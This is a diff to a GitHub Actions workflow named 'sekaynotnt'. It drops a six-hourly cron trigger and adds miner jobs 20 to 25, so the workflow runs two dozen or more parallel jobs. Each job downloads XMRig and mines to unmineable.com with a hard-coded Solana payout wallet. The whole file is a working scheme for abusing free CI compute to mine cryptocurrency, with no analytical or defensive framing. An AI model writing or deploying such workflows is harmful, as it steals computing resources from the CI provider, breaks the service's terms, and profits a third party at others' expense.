@@ -2,8 +2,6 @@ name: sekaynotnt
 
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
 
 jobs:
 
@@ -17,8 +15,7 @@ jobs:
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-        
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4  
   miner2:
     runs-on: ubuntu-latest
     steps:
@@ -30,7 +27,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner3:
     runs-on: ubuntu-latest
     steps:
@@ -42,7 +38,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner4:
     runs-on: ubuntu-latest
     steps:
@@ -54,7 +49,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner5:
     runs-on: ubuntu-latest
     steps:
@@ -66,7 +60,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner6:
     runs-on: ubuntu-latest
     steps:
@@ -78,7 +71,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner7:
     runs-on: ubuntu-latest
     steps:
@@ -90,7 +82,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner8:
     runs-on: ubuntu-latest
     steps:
@@ -102,7 +93,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner9:
     runs-on: ubuntu-latest
     steps:
@@ -114,7 +104,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner10:
     runs-on: ubuntu-latest
     steps:
@@ -126,7 +115,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner11:
     runs-on: ubuntu-latest
     steps:
@@ -138,7 +126,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner12:
     runs-on: ubuntu-latest
     steps:
@@ -150,7 +137,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner13:
     runs-on: ubuntu-latest
     steps:
@@ -162,7 +148,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner14:
     runs-on: ubuntu-latest
     steps:
@@ -174,7 +159,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner15:
     runs-on: ubuntu-latest
     steps:
@@ -186,7 +170,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner16:
     runs-on: ubuntu-latest
     steps:
@@ -198,7 +181,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner17:
     runs-on: ubuntu-latest
     steps:
@@ -210,7 +192,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner18:
     runs-on: ubuntu-latest
     steps:
@@ -222,7 +203,6 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner19:
     runs-on: ubuntu-latest
     steps:
@@ -234,11 +214,65 @@ jobs:
           tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
           cd xmrig-6.22.2
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
-
   miner20:
     runs-on: ubuntu-latest
     steps:
       - name: Start Miner 20
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner21:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 21
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner22:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 22
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner23:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 23
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner24:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 24
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --tls --threads=4
+  miner25:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Miner 25
         run: |
           sudo apt update
           sudo apt install -y wget tar
